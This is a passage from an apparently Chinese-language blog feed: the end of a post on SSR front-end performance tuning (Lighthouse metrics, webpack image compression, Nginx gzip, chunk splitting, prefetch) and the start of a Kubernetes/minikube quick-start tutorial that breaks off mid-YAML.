href="https://web.dev/long-tasks-devtools">长时间任务</a>的阻塞部分之和。任何执行时间超过 50 毫秒的任务都是长任务。50 毫秒后的时间量是阻塞部分。</li><li><a href="https://web.dev/cls/">Cumulative Layout Shift</a>：累计布局便宜（CLS）是测量整个页面生命周期内发生的所有<a href="https://web.dev/cls/#expected-vs-unexpected-layout-shifts">意外</a>布局偏移中最大一连串的布局偏移分数。</li></ul><p>上面的指标可以用 Google Lighthouse 工具进行测试，得出的性能总分是最直观可以衡量 Web 应用性能的指标。性能总分的计算规则为 TBT 占 30%、LCP 占 25%、CLS 占 15%，其余三项指标各占用 10%，这能很明显的体现出各项指标的重要性。</p><p>另外，关于 Google Lighthouse，其自身是集成与 Chrome dev tools 中的，同时可以作为 npm 包进行下载，使用其提供的 cli 或者作为 node module 进行引用，这就可以在服务器端对某个页面进行自动化的性能评估（但服务器端必须集成无头浏览器，更多信息参考 <a href="https://www.npmjs.com/package/lighthouse">lighthouse - npm</a>）。</p><h1 id="静态资源优化"><a href="#静态资源优化" class="headerlink" title="静态资源优化"></a>静态资源优化</h1><p>静态资源压缩是前端性能优化中最基础的提效方案，也是效果最为明显的。尽快的完成对静态资源的加载会极大的提升 FCP 以及 LCP 指标的分数。</p><h2 id="图片压缩"><a href="#图片压缩" class="headerlink" title="图片压缩"></a>图片压缩</h2><p>对于图片压缩方案，如果想要压缩的精细，可以借助 Photoshop 等图像处理工具对图片进行手动压缩，如果采用手动压缩方案，可以参考以下处理：</p><ul><li>将图片按照渲染像素进行剪裁和压缩分辨率</li><li>采用 JPEG 格式替代 PNG 格式的图片，以换取更高的压缩率</li><li>对于单一色调的 PNG 图片，可以采用 PNG-8 仿色来对图片进行压缩</li></ul><p>如果疲于对图片进行手动压缩，那么也可以直接使用构建工具对图片进行压缩，比如 webpack 的 <code>image-webpack-loader</code>，通过以下配置加入到图片 loder 即可：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">test: /\.(png|jpe?g|gif|webp)(\?.*)?$/,</span><br><span class="line">use: [</span><br><span class="line">&#123;</span><br><span class="line">loader: &#x27;url-loader&#x27;,</span><br><span class="line">options: &#123;</span><br><span class="line">limit: 3 * 1024,</span><br><span class="line">name: `$&#123;STATIC_DIR_NAME&#125;/image/[name]_[contenthash:8].[ext]`,</span><br><span class="line">publicPath: `$&#123;getConfig().publicPath&#125;`,</span><br><span class="line">esModule: false,</span><br><span class="line">&#125;,</span><br><span class="line">&#125;,</span><br><span class="line">&#123;</span><br><span class="line">loader: &#x27;image-webpack-loader&#x27;,</span><br><span class="line">options: &#123;</span><br><span class="line">disable: process.env.NODE_ENV === &#x27;development&#x27;,</span><br><span class="line">&#125;,</span><br><span class="line">&#125;,</span><br><span class="line">],</span><br><span class="line">type: &#x27;javascript/auto&#x27;,</span><br><span class="line">&#125;,</span><br></pre></td></tr></table></figure><blockquote><p>如果遇到环境问题，尝试更换构建环境系统或者降级到 <code>image-webpack-loader@6</code> 版本。</p></blockquote><p>同时，对于较小的图片，可以使用 <code>url-loader</code>，并设置 <code>limit</code> 选项，小于指定尺寸的图片会被转为 base64 编码，这有利于加快页面的展示速度，尽快的加载用户所看到的图片，这个方案在 SSR 项目中使用时，会减少用户首屏渲染时等待图片的加载数，一定程度上也会提高 LCP 的渲染速度。</p><h1 id="Gzip"><a href="#Gzip" class="headerlink" title="Gzip"></a>Gzip</h1><p>使用 gzip 对前端的静态资源文件（主要是 js、css 文件）进行压缩后传输，会大大减小请求的大小，加快用户对服务的访问速度。客户端如果支持 gzip 的话（服务器透过请求头 <code>accept-encoding</code> 来判断），就可以使用 gzip 压缩过的代码，客户端浏览器获取到压缩过的代码后会在客户端进行解压缩然后再调用，这个过程虽然损失了性能，但速度上会比网络请求更快（原始文件越大，压缩带来的收益越高）。</p><blockquote><p><code>accept-encoding</code> 请求头的值代表当前浏览器所支持的压缩标准，现在主流的浏览器都支持 gzip，较新的浏览器会支持 br 这种效率更高的压缩方式（只有在 https 请求时，浏览器才会支持 br 的压缩）。如果服务端返回的是压缩过的资源，会使用 <code>content-encoding</code> 来告知浏览器当前资源采用了哪种压缩方式。</p></blockquote><p><a href="https://zh.wikipedia.org/wiki/Gzip">关于 gzip 的更多信息</a></p><h2 id="服务器动态压缩"><a href="#服务器动态压缩" class="headerlink" title="服务器动态压缩"></a>服务器动态压缩</h2><p>通常，主流的网页服务器（如Nginx、Caddy）都支持对静态文件进行 gzip。当浏览器发送请求到网页服务器后，它们在返回静态资源时，会对静态资源进行实时压缩后再进行传输。以 Nginx 为例，可以在 ngxin 配置文件中写入：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"># 开启gzip</span><br><span class="line">gzip on;</span><br><span class="line"></span><br><span class="line"># 启用gzip压缩的最小文件，小于设置值的文件将不会压缩</span><br><span class="line">gzip_min_length 1k;</span><br><span class="line"></span><br><span class="line"># gzip 压缩级别，1-9，数字越大压缩的越好，也越占用CPU时间</span><br><span class="line">gzip_comp_level 5;</span><br><span class="line"></span><br><span class="line"># 进行压缩的文件类型。javascript有多种形式。其中的值可以在 mime.types 文件中找到。</span><br><span class="line">gzip_types text/plain application/javascript application/x-javascript text/css application/xml text/javascript application/x-httpd-php image/jpeg image/gif image/png application/vnd.ms-fontobject font/ttf font/opentype font/x-woff image/svg+xml;</span><br><span class="line"></span><br><span class="line"># 是否在http header中添加Vary: Accept-Encoding，建议开启</span><br><span class="line">gzip_vary on;</span><br><span class="line"></span><br><span class="line"># 禁用IE 6 gzip</span><br><span class="line">gzip_disable &quot;MSIE [1-6]\.&quot;;</span><br><span class="line"></span><br><span class="line"># 设置压缩所需要的缓冲区大小     </span><br><span class="line">gzip_buffers 32 4k;</span><br></pre></td></tr></table></figure><blockquote><p>配置可以写入到 <code>http</code>, <code>server</code>, <code>location</code> 任意片段中</p></blockquote><p>这种压缩方式我们称之为<strong>动态压缩</strong>，其好处是可以通过配置将所有请求的静态资源都进行压缩，但缺点就是耗费服务器性能，因为每次请求都需要对原文件进行压缩后再发送，压缩过的文件是无法被重复利用的。</p><h2 id="服务器静态压缩"><a href="#服务器静态压缩" class="headerlink" title="服务器静态压缩"></a>服务器静态压缩</h2><p>那么与之对应的另外一种方式就是<strong>静态压缩</strong>，这种方法是通过使用 webpack、gulp 等前端构建工具，在编译完代码后，直接将生成 js、css 等静态文件进行压缩，并生成一个压缩后的副本，比如编译完成后生成 <code>main.js</code> 和 <code>main.js.gz</code> 两个文件，后者为前者的压缩后文件。</p><p>将这些文件上传到服务器后，当网页服务器接收到静态资源的请求后，会主动查找服务器目录里有没有存放对应的压缩文件，如果有的话就直接将该压缩文件传递给客户端。</p><p>这里，在构建代码时以 webpack 为例，可以使用 <a href="https://www.npmjs.com/package/compression-webpack-plugin">compression-webpack-plugin</a> 对代码进行压缩：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> config = &#123;</span><br><span class="line"><span class="comment">// ... ...</span></span><br><span class="line"><span class="attr">plugins</span>: [</span><br><span class="line"><span class="comment">// ... ...</span></span><br><span class="line"><span class="keyword">new</span> <span class="title class_">CompressionPlugin</span>(&#123;</span><br><span class="line">            <span class="attr">test</span>: <span class="regexp">/\.(js|css)$/</span>, <span class="comment">// 只压缩 js 与 css 文件</span></span><br><span class="line">        &#125;),</span><br><span class="line">]</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>nginx 配置需要用到 <a href="http://nginx.org/en/docs/http/ngx_http_gzip_static_module.html">ngx_http_gzip_static_module</a>，新版的 ngixn 会自带该 module，只需要添加相关配置即可启用：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gzip_static on</span><br></pre></td></tr></table></figure><blockquote><p>配置可以写入到 <code>http</code>, <code>server</code>, <code>location</code> 任意片段中</p></blockquote><h1 id="优化样式加载"><a href="#优化样式加载" class="headerlink" title="优化样式加载"></a>优化样式加载</h1><p>在 SSR 应用中，如果不对应用样式进行任何处理的话，从服务端生成 HTML 到完成客户端激活的这一过程中，HTML 样式是空白的，因为 SSR 升成 HTML 的过程中是无法生成样式的（很遗憾，vue-style-loader 在 Vue3 项目中无法在服务端渲染时生成生成当前页面的样式并注入到 HTML 中）。</p><p>为了避免样式闪烁问题，最粗暴的做法就是在服务端渲染的过程中把所有 Style 标签都插入到 HTML 中，但这样的话就会严重拖慢 FCP 导致性能评分降低，因为 CSS 加载会阻塞页面渲染。因此必须对每个页面进行按需加载页面样式。</p><p>一个比较讨巧的方案是使用 Webpack 的分包的逻辑，在使用了 vue-router 以及路由懒加载的情况，我们可以使用 <code>webpackChunkName</code> 的备注来对某个页面组件进行分包包名的指定，如：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> <span class="title function_">Home</span> = (<span class="params"></span>) =&gt; <span class="title function_">import</span>(<span class="comment">/* webpackChunkName: &quot;Home&quot; */</span> <span class="string">&#x27;@/views/Home/index.vue&#x27;</span>);</span><br></pre></td></tr></table></figure><p>这样，对于 Home 页面需要用到的 JS 会被打包为 <code>Home.[hash].js</code>，页面中用到的 CSS 就会被打包为 <code>Home.[hash].css</code>，这样我们在服务端渲染时，就可以通过判断路由名来获取当前用户访问的页面，再通过页面与 webpackChunkName 的对应关系，就可以获取到当前页面的 css 文件名，只需要将这个文件作为 style 标签注入到生成的 html 中即可。</p><p>总之，如果我们使用 WebPack 进行 vue3 项目的搭建，加载 css 的思路就是通过静态分析当前页面所用到的 chunk，然后再获取 chunk 对应到的 css 即可。同时要注意，对于全局样式，所用到的 css 也会被打包到主包的 chunk 中，需要正确的引用到。</p><h1 id="代码分包"><a href="#代码分包" class="headerlink" title="代码分包"></a>代码分包</h1><p>使用 Webpack 打包项目时，需要额外注意代码的分包情况。手动控制分包可以使用 <a href="https://webpack.docschina.org/plugins/split-chunks-plugin/">Webpack splitchunks</a> 配置项进行优化。</p><p>默认的优化规则如下：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable language_">module</span>.<span class="property">exports</span> = &#123;</span><br><span class="line">  <span class="comment">//...</span></span><br><span class="line">  <span class="attr">optimization</span>: &#123;</span><br><span class="line">    <span class="attr">splitChunks</span>: &#123;</span><br><span class="line">      <span class="attr">chunks</span>: <span class="string">&#x27;async&#x27;</span>,</span><br><span class="line">      <span class="attr">minSize</span>: <span class="number">20000</span>,</span><br><span class="line">      <span class="attr">minRemainingSize</span>: <span class="number">0</span>,</span><br><span class="line">      <span class="attr">minChunks</span>: <span class="number">1</span>,</span><br><span class="line">      <span class="attr">maxAsyncRequests</span>: <span class="number">30</span>,</span><br><span class="line">      <span class="attr">maxInitialRequests</span>: <span class="number">30</span>,</span><br><span class="line">      <span class="attr">enforceSizeThreshold</span>: <span class="number">50000</span>,</span><br><span class="line">      <span class="attr">cacheGroups</span>: &#123;</span><br><span class="line">        <span class="attr">defaultVendors</span>: &#123;</span><br><span class="line">          <span class="attr">test</span>: <span class="regexp">/[\\/]node_modules[\\/]/</span>,</span><br><span class="line">          <span class="attr">priority</span>: -<span class="number">10</span>,</span><br><span class="line">          <span class="attr">reuseExistingChunk</span>: <span class="literal">true</span>,</span><br><span class="line">        &#125;,</span><br><span class="line">        <span class="attr">default</span>: &#123;</span><br><span class="line">          <span class="attr">minChunks</span>: <span class="number">2</span>,</span><br><span class="line">          <span class="attr">priority</span>: -<span class="number">20</span>,</span><br><span class="line">          <span class="attr">reuseExistingChunk</span>: <span class="literal">true</span>,</span><br><span class="line">        &#125;,</span><br><span class="line">      &#125;,</span><br><span class="line">    &#125;,</span><br><span class="line">  &#125;,</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>在默认的规则下，只有通过异步引入的包才会被单独拆分到一个文件中，比如 vue-router 的路由懒加载。我们可以将 <code>splitChunks.chunks</code> 改为 <code>all</code>，那么 webpack 就会将所有的包进行静态分析后进行拆分，举例来说：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">splitChunks</span>: &#123;</span><br><span class="line"><span class="attr">chunks</span>: <span class="string">&#x27;all&#x27;</span>,</span><br><span class="line"><span class="attr">cacheGroups</span>: &#123;</span><br><span class="line"><span class="attr">vendor</span>: &#123;</span><br><span class="line"><span class="attr">test</span>: <span class="regexp">/[\\/]node_modules[\\/]/</span>,</span><br><span class="line"><span class="attr">name</span>: <span class="string">&#x27;vendor&#x27;</span>,</span><br><span class="line"><span class="attr">priority</span>: -<span class="number">10</span>,</span><br><span class="line"><span class="attr">reuseExistingChunk</span>: <span class="literal">true</span>,</span><br><span class="line"><span class="attr">minChunks</span>: <span class="number">3</span>,</span><br><span class="line">&#125;,</span><br><span class="line"><span class="attr">default</span>: &#123;</span><br><span class="line"><span class="attr">priority</span>: -<span class="number">20</span>,</span><br><span class="line"><span class="attr">reuseExistingChunk</span>: <span class="literal">true</span>,</span><br><span class="line"><span class="attr">minChunks</span>: <span class="number">3</span>,</span><br><span class="line">&#125;,</span><br><span class="line">&#125;,</span><br><span class="line">&#125;,</span><br></pre></td></tr></table></figure><p>按照默认的配置，打包完成后，我们的入口文件 <code>mian.js</code> 会是最大的，因为入口文件会引入很多第三方库以及 vue 框架的代码；但如果改为上面的配置，<code>main.js</code> 会小的很多，但是会生成一个很大的 <code>vendor.js</code> 文件，这个文件会将我们引用到的 node 模块都打包到 <code>vendor.js</code> 中，这样做的好处是可以极大化的减少其他文件的大小，避免重复的引用、重复的打包，但坏处就是会造成主包比较大，因此，我们还可以使用 <code>minChunks</code> 来规定只有引用过目标次数的包才会被打包到 <code>vendor.js</code> 下，这样就避免了无必要的提前加载。</p><p>另外一个使用场景是我们可以将某个 npm 包打包为单独的一个 js 文件，比如对于按需引用使用的 Element Plus，A 页面和 B 页面同时使用了某个组件，那么这个组件就会被打包到 A 页面和 B 页面，同时，我们也不想让其被打包到 <code>vendor.js</code> 中，那么我们就可以设置如下配置：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">splitChunks</span>: &#123;</span><br><span class="line"><span class="attr">chunks</span>: <span class="string">&#x27;all&#x27;</span>,</span><br><span class="line"><span class="attr">cacheGroups</span>: &#123;</span><br><span class="line"><span class="attr">elementPlus</span>: &#123;</span><br><span class="line"><span class="attr">test</span>: <span class="regexp">/[\\/]node_modules[\\/]element-plus(.*)/</span>,</span><br><span class="line"><span class="attr">name</span>: <span class="string">&#x27;element-plus&#x27;</span>,</span><br><span class="line"><span class="attr">priority</span>: <span class="number">20</span>,</span><br><span class="line"><span class="attr">reuseExistingChunk</span>: <span class="literal">true</span>,</span><br><span class="line">&#125;,</span><br><span class="line"><span class="attr">vendor</span>: &#123;</span><br><span class="line"><span class="attr">test</span>: <span class="regexp">/[\\/]node_modules[\\/]/</span>,</span><br><span class="line"><span class="attr">name</span>: <span class="string">&#x27;vendor&#x27;</span>,</span><br><span class="line"><span class="attr">priority</span>: -<span class="number">10</span>,</span><br><span class="line"><span class="attr">reuseExistingChunk</span>: <span class="literal">true</span>,</span><br><span class="line"><span class="attr">minChunks</span>: <span class="number">3</span>,</span><br><span class="line">&#125;,</span><br><span class="line"><span class="attr">default</span>: &#123;</span><br><span class="line"><span class="attr">priority</span>: -<span class="number">20</span>,</span><br><span class="line"><span class="attr">reuseExistingChunk</span>: <span class="literal">true</span>,</span><br><span class="line"><span class="attr">minChunks</span>: <span class="number">3</span>,</span><br><span class="line">&#125;,</span><br><span class="line">&#125;,</span><br><span class="line">&#125;,</span><br></pre></td></tr></table></figure><p>Element Plus 会被单独打包为 <code>element-plus.js</code> 文件，同时，其样式文件也会被分析到一同打包到 <code>element-plus.css</code> 文件中，这样不仅有利于我们减少不必要的组件打包次数，同时还可以单独拆分出来 Element Plus 的样式，提供给 SSR 是进行加载。</p><p>总之，调整分包配置是迫不得已的行为，如果你不满足 webpack 的默认分包规则，想要尽可能的提升浏览器并发请求的能力，就可以针对主包进行更为细致的拆分。</p><h1 id="正确的预载"><a href="#正确的预载" class="headerlink" title="正确的预载"></a>正确的预载</h1><p>浏览器的预加载对于提高页面的整体性能也非常有效，经过实践，可以带来大约 10 分的总分提升。但是如果使用了错误的预载方式，那么就会导致浏览器阻塞去加载更多无用的资源，导致性能大打折扣。</p><p>主流的浏览器预加载分为两中 <code>prefetch</code> 与 <code>preload</code>：</p><ul><li>prefetch 代表后续页面需要加载的资源</li><li>preload 代表当前页面需要加载的资源</li></ul><p>prefetch 会在浏览器线程空闲的时候加载资源，尽可能的加快用户对后续资源的访问速度，是非常好用的一个手段（但是站在用户的角度，prefetch 会消耗用户额外的流量），由于其是在浏览器线程空闲时下载，因此不会占用应用加载的速度，对性能评分产生负面影响。</p><p>但是 preload 与 prefetch 不通的是，其加载的是浏览器当前页面需要的资源，会阻塞渲染过程，因此过多的 preload 会大幅降低浏览器的性能评分！且如果浏览器 preload 的资源在页面加载完成后的 3s 内没有被使用，浏览器控制台会弹出对应的警告，可以以此来判断是否使用了错误的 preload。</p><p>使用 <code>@vue/preload-webpack-plugin</code> 可以在编译好的 html 中自动插入所有的 js 与 css 作为 prefetch 资源（vue-cli 会默认添加该插件），按照如下配置即可：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line"><span class="attr">plugins</span>: [<span class="keyword">new</span> <span class="title class_">PreloadWebpackPlugin</span>(&#123;<span class="attr">rel</span>: <span class="string">&#x27;prefetch&#x27;</span><span class="comment">/** 注意改为 prefeth，默认为 preload */</span>&#125;)];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 前端 </category>
          
          <category> 前端工程化 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> SSR </tag>
            
            <tag> 服务端渲染 </tag>
            
            <tag> 性能优化 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>K8S 快速入门指南</title>
      <link href="/2022/09/0887d7c19c38.html"/>
      <url>/2022/09/0887d7c19c38.html</url>
      
        <content type="html"><![CDATA[<blockquote><p>视频：<a href="https://www.bilibili.com/video/BV1Tg411P7EB/?vd_source=b233b2041b0c7ce85a2c9111063e461f">Kubernetes (K8S) 3 小时快速上手 + 实践，无废话纯干货</a></p></blockquote><h1 id="1-安装-minikube"><a href="#1-安装-minikube" class="headerlink" title="1. 安装 minikube"></a>1. 安装 minikube</h1><h2 id="指定-kubectl-使用的配置文件"><a href="#指定-kubectl-使用的配置文件" class="headerlink" title="指定 kubectl 使用的配置文件"></a>指定 kubectl 使用的配置文件</h2><p>kubectl 是基于 HTTP 可以对多个集群进行操作的，因此 kubectl 具体操作哪个集群是需要用户进行一定的配置的。具体的配置文件在 <code>$HOME/.kube</code> 目录下存放。当 minikube 安装完成并启动后，会自动将配置文件改写为指向 minikube，你可以查看 <code>$HOME/.kube/config</code> 文件中的内容，其内容为即为连接 minikube 的配置文件。</p><p>执行 <code>minikube start</code> 前的默认配置文件：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">apiVersion: v1</span><br><span class="line">clusters: null</span><br><span class="line">contexts: null</span><br><span class="line">current-context: &quot;&quot;</span><br><span class="line">kind: Config</span><br><span class="line">preferences: &#123;&#125;</span><br><span class="line">users: null</span><br></pre></td></tr></table></figure><p>执行 <code>minikube start</code> 后配置文件被改写为：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">apiVersion: v1</span><br><span class="line">clusters:</span><br><span class="line">- cluster:</span><br><span class="line">    certificate-authority: /Users/***/.minikube/ca.crt</span><br><span class="line">    extensions:</span><br><span class="line">    - extension:</span><br><span class="line">        last-update: Thu, 15 Sep 2022 15:02:11 CST</span><br><span class="line">        provider: minikube.sigs.k8s.io</span><br><span class="line">        version: v1.26.1</span><br><span class="line">      name: cluster_info</span><br><span class="line">    server: https://127.0.0.1:53926</span><br><span class="line">  name: minikube</span><br><span class="line">contexts:</span><br><span class="line">- context:</span><br><span class="line">    cluster: minikube</span><br><span class="line">    extensions:</span><br><span class="line">    - extension:</span><br><span class="line">        last-update: Thu, 15 Sep 2022 15:02:11 CST</span><br><span class="line">        provider: minikube.sigs.k8s.io</span><br><span class="line">        version: v1.26.1</span><br><span class="line">      name: context_info</span><br><span class="line">    namespace: default</span><br><span class="line">    user: minikube</span><br><span class="line">  name: minikube</span><br><span class="line">current-context: minikube</span><br><span class="line">kind: Config</span><br><span class="line">preferences: &#123;&#125;</span><br><span class="line">users:</span><br><span class="line">- name: minikube</span><br><span class="line">  user:</span><br><span class="line">    client-certificate: /Users/***/.minikube/profiles/minikube/client.crt</span><br><span class="line">    client-key: /Users/***/.minikube/profiles/minikube/client.key</span><br></pre></td></tr></table></figure><p>同理，你也可以通过指定配置文件来访问集群，只需要在操作指令前加上 <code>--kubeconfig</code> 来指定目标配置文件即可，如：</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">kubectl --kubeconfig kubectl.conf -n <span class="built_in">test</span> get pod</span><br></pre></td></tr></table></figure><h1 id="2-部署应用"><a href="#2-部署应用" class="headerlink" title="2. 部署应用"></a>2. 部署应用</h1><p>应用部署行为都是在 master 节点上执行的，目标是为了将多个 pod 部署到 woker 节点上。在部署多个 pod 的过程中，k8s 会自动或按照用户制定的规则，将这些 pod 分配给不同的 worker 节点。``</p><h2 id="2-1-使用命令行"><a href="#2-1-使用命令行" class="headerlink" title="2.1 使用命令行"></a>2.1 使用命令行</h2><p>可以使用 <code>kubectl</code> 命令行来部署应用：</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">kubectl run test-cli --image=ccr.ccs.tencentyun.com/k8s-tutorial/test-k8s:v1</span><br></pre></td></tr></table></figure><p>部署完成之后会创建一个 pod，通过 <code>kubectl get pod</code> 可以查看到该 pod：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">NAME                        READY   STATUS    RESTARTS   AGE</span><br><span class="line">test-cli                    1/1     Running   0          0s</span><br></pre></td></tr></table></figure><blockquote><p>使用 <code>kubectl get pod -o wide</code> 可以参看更详细的信息</p></blockquote><h2 id="2-2-使用-Pod-类型的工作负载文件"><a href="#2-2-使用-Pod-类型的工作负载文件" class="headerlink" title="2.2 使用 Pod 类型的工作负载文件"></a>2.2 使用 Pod 类型的工作负载文件</h2><p>此外，可以编写一个 YAML 文件来创建 pod：</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># pod.yaml</span></span><br><span class="line"><span class="attr">apiVersion:</span> <span class="string">v1</span></span><br><span class="line"><span class="attr">kind:</span> <span class="string">Pod</span></span><br><span class="line"><span class="attr">metadata:</span></span><br><span class="line">  <span class="attr">name:</span> <span class="string">test-pod</span></span><br><span class="line"><span class="attr">spec:</span></span><br><span class="line">  <span class="comment"># 定义容器，可以多个</span></span><br><span class="line">  <span class="attr">containers:</span></span><br><span class="line">    <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">node-app</span> <span class="comment"># 容器名字</span></span><br><span class="line">      <span class="attr">image:</span> <span class="string">ccr.ccs.tencentyun.com/k8s-tutorial/test-k8s:v1</span> <span class="comment"># 镜像</span></span><br></pre></td></tr></table></figure><p>使用指令部署该文件：<code>kubectl apply -f ./pod.yaml</code></p><p>创建完成后查看创建的 pod：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">NAME                        READY   STATUS    RESTARTS   AGE</span><br><span class="line">test-pod                    1/1     Running   0          0s</span><br></pre></td></tr></table></figure><h2 id="2-3-使用-Deployment-类型的工作负载"><a href="#2-3-使用-Deployment-类型的工作负载" class="headerlink" title="2.3 使用 Deployment 类型的工作负载"></a>2.3 使用 Deployment 类型的工作负载</h2><p>上面的文件只能创建一个 pod，如果你想要创建多个 pod，可以编写一个类型为 <code>Deployment</code> 的文件来创建多个 pod：</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># deployment.yaml</span></span><br><span class="line"><span class="attr">apiVersion:</span> <span class="string">apps/v1</span></span><br><span class="line"><span class="attr">kind:</span> <span class="string">Deployment</span></span><br><span class="line"><span class="attr">metadata:</span></span><br><span class="line">  <span class="comment"># 部署名字</span></span><br><span class="line">  <span class="attr">name:</span> <span class="string">test-deployment</span></span><br><span class="line"><span class="attr">spec:</span></span><br><span class="line">  <span class="attr">replicas:</span> <span class="number">2</span></span><br><span class="line">  <span class="comment"># 用来查找关联的 Pod，所有标签都匹配才行</span></span><br><span class="line">  <span class="attr">selector:</span></span><br><span class="line">    <span class="attr">matchLabels:</span></span><br><span class="line">      <span class="attr">app:</span> <span class="string">node-app</span></span><br><span class="line">  <span class="comment"># 定义 Pod 相关数据</span></span><br><span class="line">  <span class="attr">template:</span></span><br><span class="line">    <span class="attr">metadata:</span></span><br><span class="line">      <span class="attr">labels:</span></span><br><span class="line">        <span class="attr">app:</span> <span class="string">node-app</span></span><br><span class="line">    <span class="attr">spec:</span></span><br><span class="line">      <span class="comment"># 